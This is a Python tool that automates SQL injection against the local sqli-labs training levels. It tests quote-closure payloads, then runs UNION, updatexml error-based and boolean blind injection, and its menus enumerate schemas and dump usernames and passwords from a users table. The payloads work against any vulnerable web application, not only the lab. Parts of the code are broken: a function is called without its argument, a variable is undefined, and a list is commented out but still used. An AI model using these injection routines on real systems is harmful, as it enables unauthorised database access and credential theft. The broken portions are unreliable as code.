import re
import requests
import threading
import time


# 为线程定义一个函数
class DownThread:
    def __init__(self):
        self._running = False

    def startThread(self):
        self._running = True

    def terminate(self):
        self._running = False

    def run(self, delay=1):
        n = 0
        while True:
            time.sleep(delay)
            if self._running:
                print(".", end="")
                n = n + 1
                if n % 10 == 0:
                    print("")


C_select_thread = DownThread()
select_thread = threading.Thread(target=C_select_thread.run)
select_thread.start()

# 这是闭合模式
Closed_mode = ""
# 这是正确的模式传出header里面的Content—Length的长度
# 继续开发需要改为test
ContentLength_State_True = ""
ContentLength_State_text_True = ""
# version()的长度
nVersion_lenth = 0
# 正确的version()字符串
szbuf_vertion = ""
# order by 的返回结果
ContentLength_Order_by = ""
# select 联合查询字段数
nSelect_lenth = 0
# 判断是否总是空输出
szbuf_empty = 0
# # 包含所有字母、下划线、数字、"."
# keys = [".", '1', '2', '3', '4', '5', '6', '7', '8', '9', '0',
#         "_", "q", 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', 'a',
#         's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'z', 'x', 'c', 'v', 'b', 'n', 'm',
#         'Q', 'W', 'E', 'R', 'T', 'Y', 'U', 'I', 'O', 'P', 'A', 'S', 'D', 'F', 'G', 'H', 'J',
#         'K', 'L', 'Z', 'X', 'C', 'V', 'B', 'N', 'M'
#         ]
# keys_capital = ['Q', 'W', 'E', 'R', 'T', 'Y', 'U', 'I', 'O', 'P', 'A', 'S', 'D', 'F', 'G', 'H', 'J', 'K', 'L', 'Z', 'X',
#                 'C', 'V', 'B', 'N', 'M']
keys_capital_01 = ('A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J')
keys_capital_02 = ('K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S')
keys_capital_03 = ('T', 'U', 'V', 'W', 'X', 'Y', 'Z')

keys_lowercase_01 = []
keys_lowercase_02 = []
keys_lowercase_03 = []
n = "a"
while n <= "j":
    test = ord(n)
    keys_lowercase_01.append(n)
    test += 1
    n = chr(test)
while n <= "s":
    test = ord(n)
    keys_lowercase_02.append(n)
    test += 1
    n = chr(test)
while n <= "z":
    test = ord(n)
    keys_lowercase_03.append(n)
    test += 1
    n = chr(test)

# keys_lowercase = ["q", 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'z',
#                   'x', 'c', 'v', 'b', 'n', 'm']
keys_number = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '0']
key_special_01 = "."
key_special_02 = "_"
# # 46 95
# # 48-57 数字
# # 65-90 大写
# # 97-122 小写


list_Closed_mode_true = [
'''1 and 1 = 1 --+''',
"""1' and 1 = 1 --+""",
"""1') and 1 = 1 --+""",
"""1')) and 1 = 1 --+""",
'''1" and 1 = 1 --+''',
'''1") and 1 = 1 --+''',
'''1")) and 1 = 1 --+'''
]
list_Closed_mode_false = [
'''1 and 1 = 0 --+''',
"""1' and 1 = 0 --+""",
"""1') and 1 = 0 --+""",
"""1')) and 1 = 0 --+""",
'''1" and 1 = 0 --+''',
'''1") and 1 = 0 --+''',
'''1")) and 1 = 0 --+'''
]


# 这里是遍历我的闭合模式然后判断是哪种闭合模式
def Closed_mode_function():
    print("\n判断闭合方式\n")
    global ContentLength_State_True
    global Closed_mode
    global ContentLength_State_text_True
    for Closed_mode_key in range(7):
        print("[", list_Closed_mode_true[Closed_mode_key][1:-13], "]", end=" ")
        test_url = url + list_Closed_mode_true[Closed_mode_key]
        # 发起请求: 获取网页的内容
        # print(test_url)
        content_test_true = requests.get(url=test_url)
        # 得到Content-Length然后对比是否正确
        content_true = content_test_true.headers["Content-Length"]

        test_url = url + list_Closed_mode_false[Closed_mode_key]
        content_test_false = requests.get(url=test_url)
        content_false = content_test_false.headers["Content-Length"]
        # 如何得到闭合模式 则保存到全局变量
        if content_true != content_false or content_test_true.text != content_test_false.text:
            print("[ok]")
            ContentLength_State_True = content_true
            ContentLength_State_text_True = content_test_true.text
            Closed_mode = list_Closed_mode_true[Closed_mode_key]
            break


# 报错注入详细信息
def Erorr_information(szbuf_test_url):
    szbuf_empty = 0
    # url_bool_test = url + Closed_mode[:-13] + " and 0  union SELECT updatexml(1,concat(0x7e,version()),3) %23"
    # 保存自定义 http header 的字典，其中可以添加自定义的 http 头
    headers = {
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36 Edg/85.0.564.51',
        'abcdefg': 'hijklmn'
    }
    for ele in range(100):
        url_bool_test = url + Closed_mode[:-13] + szbuf_test_url + "{},1)),0) -- 1".format(ele)
        # print(url_bool_test)
        # 发起请求: 获取网页的内容
        content = requests.get(url=url_bool_test, headers=headers)
        # <font size="3" color="#FFFF00">XPATH syntax error: '~5.5.53'<br></font>
        szbuf_Erorr = re.findall("XPATH syntax error:(.*?)</font>", content.text)
        if len(szbuf_Erorr) > 0:
            print("".join(szbuf_Erorr)[3:-6])
            szbuf_empty += 1
        else:
            if szbuf_empty == 0:
                return 0
            return 1


# 报错注入详细信息
def Erorr_information_username_password(szbuf_test_url_01, szbuf_test_url_02):
    szbuf_empty = 0
    # url_bool_test = url + Closed_mode[:-13] + " and 0  union SELECT updatexml(1,concat(0x7e,version()),3) %23"
    # 保存自定义 http header 的字典，其中可以添加自定义的 http 头
    headers = {
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36 Edg/85.0.564.51',
        'abcdefg': 'hijklmn'
    }
    for ele in range(100):
        url_bool_test_01 = url + Closed_mode[:-13] + szbuf_test_url_01 + "{},1)),0) -- 1".format(ele)
        url_bool_test_02 = url + Closed_mode[:-13] + szbuf_test_url_02 + "{},1)),0) -- 1".format(ele)
        print("payload:", url_bool_test_02)
        # 发起请求: 获取网页的内容
        content_01 = requests.get(url=url_bool_test_01, headers=headers)
        # <font size="3" color="#FFFF00">XPATH syntax error: '~5.5.53'<br></font>
        szbuf_Erorr_01 = re.findall("XPATH syntax error:(.*?)</font>", content_01.text)
        content_02 = requests.get(url=url_bool_test_02, headers=headers)
        # <font size="3" color="#FFFF00">XPATH syntax error: '~5.5.53'<br></font>
        szbuf_Erorr_02 = re.findall("XPATH syntax error:(.*?)</font>", content_02.text)
        if len(szbuf_Erorr_01) > 0 or len(szbuf_Erorr_02) > 0:
            print("".join(szbuf_Erorr_01)[3:-6], end=" ")
            print("".join(szbuf_Erorr_02)[3:-6])
            szbuf_empty += 1
        else:
            if szbuf_empty == 0:
                return 0
            return 1


# 错误信息注入
def Erorr_Injection(szbuf_test_url):
    # url_bool_test = url + Closed_mode[:-13] + " and 0  union SELECT updatexml(1,concat(0x7e,version()),3) %23"
    url_bool_test = url + Closed_mode[:-13] + szbuf_test_url
    print("payload:", url_bool_test)
    # 保存自定义 http header 的字典，其中可以添加自定义的 http 头
    headers = {
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36 Edg/85.0.564.51',
        'abcdefg': 'hijklmn'
    }
    # 发起请求: 获取网页的内容
    content = requests.get(url=url_bool_test, headers=headers)
    # <font size="3" color="#FFFF00">XPATH syntax error: '~5.5.53'<br></font>
    szbuf_Erorr = re.findall("XPATH syntax error:(.*?)</font>", content.text)
    if len(szbuf_Erorr) > 0:
        print("\n报错注入成功\n")
        print("".join(szbuf_Erorr)[3:-6])

    bWhile_value = True
    while True:
        nUser_selection = input(
"""
请输入指令:
1.查询database()
2.查询指定数据库名所有表名
3.查询指定表下的所有字段名
4.查询指定表下字段及对应的信息
5.一键查询用户名和密码
0.退出

""")

        if nUser_selection == "1":
            C_select_thread.startThread()
            url_select_database = " or updatexml(1,concat(0x7e, (select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit "
            if Erorr_information(url_select_database) == 0:
                return 0
        if nUser_selection == "2":
            szUser_database_NAME = input("请输入要查询的数据库名:")
            C_select_thread.startThread()
            url_select_database = " or updatexml(1,concat(0x7e, (select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA='{}' limit ".format(
                szUser_database_NAME, szUser_database_NAME)
            if Erorr_information(url_select_database) == 0:
                return 0
        if nUser_selection == "3":
            szUser_TABLE_NAME = input("请输入要查询的表名:")
            C_select_thread.startThread()
            url_select_database = " or updatexml(1,concat(0x7e, (select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME='{}' limit".format(
                szUser_TABLE_NAME, szUser_TABLE_NAME)
            if Erorr_information(url_select_database) == 0:
                return 0
        if nUser_selection == "4":
            szUser_TABLE_NAME = input("请输入要查询的表名:")
            szUser_COLUMN_name01 = input("请输入要查询的字段1:")
            szUser_COLUMN_name02 = input("请输入要查询的字段2:")
            C_select_thread.startThread()
            url_select_database_01 = " or updatexml(1,concat(0x7e, (select {} from {}  limit ".format(
                szUser_COLUMN_name01, szUser_TABLE_NAME)
            url_select_database_02 = " or updatexml(1,concat(0x7e, (select {} from {}  limit ".format(
                szUser_COLUMN_name02, szUser_TABLE_NAME)
            if Erorr_information_username_password(url_select_database_01, url_select_database_02) == 0:
                return 0
        if nUser_selection == "5":
            url_select_database_01 = " or updatexml(1,concat(0x7e, (select username from users  limit "
            url_select_database_02 = " or updatexml(1,concat(0x7e, (select password from users  limit "
            if Erorr_information_username_password(url_select_database_01, url_select_database_02) == 0:
                return 0
        if nUser_selection == "0":
            break


# 盲注下的指定查询长度
def Get_lenth_Blind(szbuf_test_url):
    for ele in range(1, 10):
        # url_bool_test = url + Closed_mode[:-13] + " and length(version())="+"{} %23".format(ele)
        url_bool_test = url + Closed_mode[:-13] + szbuf_test_url + "{} %23".format(ele)
        # print(url_bool_test)
        content_test_true = requests.get(url=url_bool_test)
        content_true = content_test_true.headers["Content-Length"]
        if content_test_true.text == ContentLength_State_text_True:
            print("")
            print("payload:", url_bool_test)
            # print("version()的长度为{}".format(ele))
            nVersion_lenth = ele + 1
            return nVersion_lenth


# 盲注下的根据长度查询详细信息 (废弃)
def Get_Information_Blind(szbuf_test_url, lenth):
    szbuf_TEST = ""
    for ele in range(1, lenth):
        for key in keys:
            # url_bool_test = url + Closed_mode[:-13] + " and substr(version()"+",{},1)={} %23".format(ele, hex(ord(key)))
            url_bool_test = url + Closed_mode[:-13] + szbuf_test_url + ",{},1)={} %23".format(ele, hex(ord(key)))
            # print(url_bool_test)
            content_test_true = requests.get(url=url_bool_test)
            content_true = content_test_true.headers["Content-Length"]
            if content_test_true.text == ContentLength_State_text_True:
                # print(key,end="")
                szbuf_TEST += key
                break
    return szbuf_TEST


# 高效率盲注
def Blind_Injection_height_LEVEL(szbuf_test_url):
    print("\n尝试盲注")
    global key_special_01
    global key_special_02
    global nVersion_lenth
    global szbuf_vertion
    nCouut = 4
    while True:
        url_bool_test = url + Closed_mode[:-13] + " and length({})>={} %23".format(szbuf_test_url, nCouut)
        print(url_bool_test)
        content_test_true = requests.get(url=url_bool_test)
        content_true = content_test_true.headers["Content-Length"]
        if content_test_true.text == ContentLength_State_text_True:
            nCouut *= 2
        else:
            print("false")
            C_select_thread.startThread()
            break
    for ele in range(nCouut // 2, nCouut + 1):
        url_bool_test = url + Closed_mode[:-13] + " and length({})={} %23".format(szbuf_test_url, ele)
        # print(url_bool_test)
        content_test_true = requests.get(url=url_bool_test)
        content_true = content_test_true.headers["Content-Length"]
        if content_test_true.text == ContentLength_State_text_True:
            C_select_thread.terminate()
            print("")
            print("payload:", url_bool_test)
            print("长度为{}".format(ele))
            # C_select_thread.startThread()
            nVersion_lenth = ele + 1
            break

    for ele in range(1, nVersion_lenth):

        # 判断是不是小写字母
        url_bool_test = url + Closed_mode[:-13] + " and substr({},{},1)>={} %23".format(szbuf_test_url, ele,
                                                                                        hex(ord("a")))
        content_test_true = requests.get(url=url_bool_test)
        content_true = content_test_true.headers["Content-Length"]
        if content_test_true.text == ContentLength_State_text_True:
            url_bool_test = url + Closed_mode[:-13] + " and substr({},{},1)<={} %23".format(szbuf_test_url, ele,
                                                                                            hex(ord("z")))
            content_test_true = requests.get(url=url_bool_test)
            content_true = content_test_true.headers["Content-Length"]
            if content_test_true.text == ContentLength_State_text_True:
                url_bool_test = url + Closed_mode[:-13] + " and substr({},{},1)>={} %23".format(szbuf_test_url, ele,
                                                                                                hex(ord("k")))
                content_test_true = requests.get(url=url_bool_test)
                content_true = content_test_true.headers["Content-Length"]
                if content_test_true.text == ContentLength_State_text_True:
                    url_bool_test = url + Closed_mode[:-13] + " and substr({},{},1)>={} %23".format(szbuf_test_url, ele,
                                                                                                    hex(ord("t")))
                    content_test_true = requests.get(url=url_bool_test)
                    content_true = content_test_true.headers["Content-Length"]
                    if content_test_true.text == ContentLength_State_text_True:
                        for key in keys_lowercase_03:
                            url_bool_test = url + Closed_mode[:-13] + " and substr({},{},1)={} %23".format(
                                szbuf_test_url, ele,
                                hex(ord(key)))
                            # print(url_bool_test)
                            content_test_true = requests.get(url=url_bool_test)
                            content_true = content_test_true.headers["Content-Length"]
                            if content_test_true.text == ContentLength_State_text_True:
                                # print(key,end="")
                                szbuf_vertion += key
                                print(key, end="")
                                break
                    else:
                        for key in keys_lowercase_02:
                            url_bool_test = url + Closed_mode[:-13] + " and substr({},{},1)={} %23".format(
                                szbuf_test_url, ele,
                                hex(ord(key)))
                            # print(url_bool_test)
                            content_test_true = requests.get(url=url_bool_test)
                            content_true = content_test_true.headers["Content-Length"]
                            if content_test_true.text == ContentLength_State_text_True:
                                # print(key,end="")
                                szbuf_vertion += key
                                print(key, end="")
                                break
                else:
                    for key in keys_lowercase_01:
                        url_bool_test = url + Closed_mode[:-13] + " and substr({},{},1)={} %23".format(
                            szbuf_test_url, ele,
                            hex(ord(key)))
                        # print(url_bool_test)
                        content_test_true = requests.get(url=url_bool_test)
                        content_true = content_test_true.headers["Content-Length"]
                        if content_test_true.text == ContentLength_State_text_True:
                            # print(key,end="")
                            szbuf_vertion += key
                            print(key, end="")
                            break

        url_bool_test = url + Closed_mode[:-13] + " and substr({},{},1)>={} %23".format(szbuf_test_url, ele,
                                                                                        hex(ord("0")))
        content_test_true = requests.get(url=url_bool_test)
        content_true = content_test_true.headers["Content-Length"]
        if content_test_true.text == ContentLength_State_text_True:
            url_bool_test = url + Closed_mode[:-13] + " and substr({},{},1)<={} %23".format(szbuf_test_url, ele, hex(
                ord("9")))
            content_test_true = requests.get(url=url_bool_test)
            content_true = content_test_true.headers["Content-Length"]
            if content_test_true.text == ContentLength_State_text_True:
                for key in keys_number:
                    url_bool_test = url + Closed_mode[:-13] + " and substr({},{},1)={} %23".format(szbuf_test_url, ele,
                                                                                                   hex(ord(key)))
                    print(url_bool_test)
                    content_test_true = requests.get(url=url_bool_test)
                    content_true = content_test_true.headers["Content-Length"]
                    if content_test_true.text == ContentLength_State_text_True:
                        # print(key,end="")
                        szbuf_vertion += key
                        break
        # 判断是不是句号
        url_bool_test = url + Closed_mode[:-13] + " and substr({},{},1)={} %23".format(szbuf_test_url, ele,
                                                                                       hex(ord(key_special_01)))
        content_test_true = requests.get(url=url_bool_test)
        content_true = content_test_true.headers["Content-Length"]
        if content_test_true.text == ContentLength_State_text_True:
            szbuf_vertion += key_special_01[0]
        # 判断是不是_下划线
        url_bool_test = url + Closed_mode[:-13] + " and substr({},{},1)={} %23".format(szbuf_test_url, ele,
                                                                                       hex(ord(key_special_02)))
        content_test_true = requests.get(url=url_bool_test)
        content_true = content_test_true.headers["Content-Length"]
        if content_test_true.text == ContentLength_State_text_True:
            szbuf_vertion += key_special_02[0]

    C_select_thread.terminate()
    if len(szbuf_vertion) == 0:
        return 0
    print("")
    print("\n盲注成功\n")
    # print(szbuf_vertion)
    # print("")
    return 1

# (废弃)
def function_mytest(szbuf_test_url, key_test_min, key_test_max):
    key_test_MIN = "A"
    key_test_MAX = "Z"
    key_test_min = "a"
    key_test_max = "z"
    key_test_min_math = "0"
    key_test_max_math = "9"
    url_bool_test = url + Closed_mode[:-13] + " and substr({},{},1)>={} %23".format(szbuf_test_url, ele,
                                                                                    hex(ord(key_test_min)))
    content_test_true = requests.get(url=url_bool_test)
    content_true = content_test_true.headers["Content-Length"]
    if content_test_true.text == ContentLength_State_text_True:
        url_bool_test = url + Closed_mode[:-13] + " and substr({},{},1)<={} %23".format(szbuf_test_url, ele,
                                                                                        hex(ord(key_test_max)))
        content_test_true = requests.get(url=url_bool_test)
        content_true = content_test_true.headers["Content-Length"]
        if content_test_true.text == ContentLength_State_text_True:
            for key in keys_capital:
                url_bool_test = url + Closed_mode[:-13] + " and substr({},{},1)={} %23".format(szbuf_test_url, ele,
                                                                                               hex(ord(key)))
                # print(url_bool_test)
                content_test_true = requests.get(url=url_bool_test)
                content_true = content_test_true.headers["Content-Length"]
                if content_test_true.text == ContentLength_State_text_True:
                    # print(key,end="")
                    szbuf_vertion += key
                    break


# 盲注 (废弃)
def Blind_Injection():
    # time.sleep(0.5)
    C_select_thread.startThread()
    global nVersion_lenth
    global szbuf_vertion
    for ele in range(1, 10):
        url_bool_test = url + Closed_mode[:-13] + " and length(version())={} %23".format(ele)
        # print(url_bool_test)
        content_test_true = requests.get(url=url_bool_test)
        content_true = content_test_true.headers["Content-Length"]
        if content_test_true.text == ContentLength_State_text_True:
            C_select_thread.terminate()
            print("")
            print("尝试盲注")
            print("payload:", url_bool_test)
            print("长度为{}".format(ele))
            C_select_thread.startThread()
            nVersion_lenth = ele + 1
            break

    for ele in range(1, nVersion_lenth):
        for key in keys:
            url_bool_test = url + Closed_mode[:-13] + " and substr(version(),{},1)={} %23".format(ele, hex(ord(key)))
            # print(url_bool_test)
            content_test_true = requests.get(url=url_bool_test)
            content_true = content_test_true.headers["Content-Length"]
            if content_test_true.text == ContentLength_State_text_True:
                # print(key,end="")
                szbuf_vertion += key
                break
    C_select_thread.terminate()
    print("")
    print("版本信息：", szbuf_vertion)
    print("盲注成功")
    while True:
        nUser_selection = input(
 """
 请输入指令:
 1.查询database()
 2.查询指定数据库名
 3.查询指定表下的所有字段名
 4.查询指定表下字段及对应的信息
 5.一键查询用户名和密码
 0.退出

 """)
        C_select_thread.startThread()
        if nUser_selection == "1":
            url_select_database = " and length(database())="
            test_lenth = Get_lenth_Blind(url_select_database)
            url_select_database = " and substr(database()"
            search_test = Get_Information_Blind(url_select_database, test_lenth)
            C_select_thread.terminate()
            print("")
            print(search_test)
        if nUser_selection == "2":
            szUser_database_NAME = input("请输入要查询的数据库名:")
            url_select_database = " and 0 union SELECT 1,group_concat(TABLE_NAME),'{}' FROM information_schema.TABLES WHERE TABLE_SCHEMA='{}' %23 ".format(
                szUser_database_NAME, szUser_database_NAME)
            Get_Information(url_select_database)
        if nUser_selection == "3":
            szUser_TABLE_NAME = input("请输入要查询的表名:")
            url_select_database = " and 0 union SELECT 1,group_concat(COLUMN_NAME),'{}' FROM information_schema.COLUMNS WHERE TABLE_NAME='{}' %23 ".format(
                szUser_TABLE_NAME, szUser_TABLE_NAME)
            Get_Information(url_select_database)
        if nUser_selection == "4":
            szUser_TABLE_NAME = input("请输入要查询的表名:")
            szUser_COLUMN_name01 = input("请输入要查询的字段1:")
            szUser_COLUMN_name02 = input("请输入要查询的字段2:")
            url_select_database = " and 0 union SELECT 1,group_concat({}),group_concat({}) FROM {} %23 ".format(
                szUser_COLUMN_name01, szUser_COLUMN_name02, szUser_TABLE_NAME)
            Get_Information(url_select_database)
        if nUser_selection == "5":
            url_select_database = " and 0 union SELECT 1,group_concat(username),group_concat(password) FROM users %23 "
            Get_Information(url_select_database)
        if nUser_selection == "0":
            break


# 联合注入下的指定查询
def Get_Information(szbuf_test_url):
    global url
    szbuf_empty = 0
    url_Get_Information_test = url + Closed_mode[:-13] + szbuf_test_url
    # 保存自定义 http header 的字典，其中可以添加自定义的 http 头
    headers = {
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36 Edg/85.0.564.51',
        'abcdefg': 'hijklmn'
    }
    # 发起请求: 获取网页的内容
    content = requests.get(url=url_Get_Information_test, headers=headers)
    szbuf_name = re.findall("Your Login name:(.*?)<br>", content.text)
    szbuf_password = re.findall("Your Password:(.*?)</font>", content.text)
    # <font color="#FFFF00">Unknown column 'user' in 'field list'</font>
    szbuf_Unknown = re.findall('Unknown (.*?)</font>', content.text)
    szbuf_Error = re.findall('You have an error (.*?)<br></font>', content.text)
    C_select_thread.terminate()
    print("")
    if len(szbuf_name) > 0 and len(szbuf_password) > 0:
        print("".join(szbuf_name))
        print("".join(szbuf_password))
        szbuf_empty += 1
    elif len(szbuf_Unknown) > 0:
        print("请检查库名or表名是否有误~！")
        print("Unknown", "".join(szbuf_Unknown))
        szbuf_empty += 1
    elif len(szbuf_Error) > 0:
        print("报错啦~！~！")
        print("You have an error", "".join(szbuf_Error))
        szbuf_empty += 1
    else:
        if szbuf_empty == 0:
            return 0
        return 1


# 联合注入
def select_Injection():
    print("\n即将开始联合注入\n")
    C_select_thread.startThread()
    global ContentLength_Order_by
    global url
    for ele in range(1, 10):
        url_bool_test = url + Closed_mode[:-13] + " and 0 order by {} %23".format(ele)
        # print(url_bool_test)
        content_test_true = requests.get(url=url_bool_test)
        content_true = content_test_true.headers["Content-Length"]
        if content_true != ContentLength_Order_by and ele > 1:
            nSelect_lenth = ele - 1
            C_select_thread.terminate()
            print("")
            print("select查询的字段数为:{}".format(nSelect_lenth))
            break
        ContentLength_Order_by = content_true

    # 开始自动查询版本信息和database()
    szbuf_test_url = " and 1 = 0 union select 1,version(),database() %23"
    if Get_Information(szbuf_test_url) == 0:
        return 0
    bWhile_value = True
    while True:
        nUser_selection = input(
"""
请输入指令:
1.查询database()
2.查询指定数据库名
3.查询指定表下的所有字段名
4.查询指定表下字段及对应的信息
5.一键查询用户名和密码
0.退出

""")

        if nUser_selection == "1":
            C_select_thread.startThread()
            url_select_database = " and 0 union SELECT 1,group_concat(TABLE_NAME),DATABASE() FROM information_schema.TABLES WHERE TABLE_SCHEMA=DATABASE() %23 "
            if Get_Information(url_select_database) == 0:
                return 0
        if nUser_selection == "2":
            szUser_database_NAME = input("请输入要查询的数据库名:")
            C_select_thread.startThread()
            url_select_database = " and 0 union SELECT 1,group_concat(TABLE_NAME),'{}' FROM information_schema.TABLES WHERE TABLE_SCHEMA='{}' %23 ".format(
                szUser_database_NAME, szUser_database_NAME)
            if Get_Information(url_select_database) == 0:
                return
        if nUser_selection == "3":
            szUser_TABLE_NAME = input("请输入要查询的表名:")
            C_select_thread.startThread()
            url_select_database = " and 0 union SELECT 1,group_concat(COLUMN_NAME),'{}' FROM information_schema.COLUMNS WHERE TABLE_NAME='{}' %23 ".format(
                szUser_TABLE_NAME, szUser_TABLE_NAME)
            if Get_Information(url_select_database) == 0:
                return 0
        if nUser_selection == "4":
            szUser_TABLE_NAME = input("请输入要查询的表名:")
            szUser_COLUMN_name01 = input("请输入要查询的字段1:")
            szUser_COLUMN_name02 = input("请输入要查询的字段2:")
            C_select_thread.startThread()
            url_select_database = " and 0 union SELECT 1,group_concat({}),group_concat({}) FROM {} %23 ".format(
                szUser_COLUMN_name01, szUser_COLUMN_name02, szUser_TABLE_NAME)
            if Get_Information(url_select_database) == 0:
                return 0
        if nUser_selection == "5":
            url_select_database = " and 0 union SELECT 1,group_concat(username),group_concat(password) FROM users %23 "
            C_select_thread.startThread()
            if Get_Information(url_select_database) == 0:
                return 0
        if nUser_selection == "0":
            break


for ele in range(1, 11):
    # 这是url
    url = "http://127.0.0.1/sqli-labs/Less-{}/?id=1".format(ele)
    if ele > 0:
        print("")
        print("")
        print("")
    print("url:", url[:-5])
    Closed_mode_function()
    count = select_Injection()
    if count == 0:
        print("判断联合查询失败，自动开始报错注入\n")
        count_02 = Erorr_Injection(" and 0  union SELECT updatexml(1,concat(0x7e,version()),3) %23")
        if count_02 == 0:
            print("判断报错注入失败,没有获取信息，自动开始盲注")
            if Blind_Injection_height_LEVEL() == 0:
                print("\n第{}关联合注入、报错注入、盲注都失败了\n".format(ele))
                continue
    print("\n第{}关注入成功\n".format(ele))
    print("开始下一关")

print("\n我退出了\n")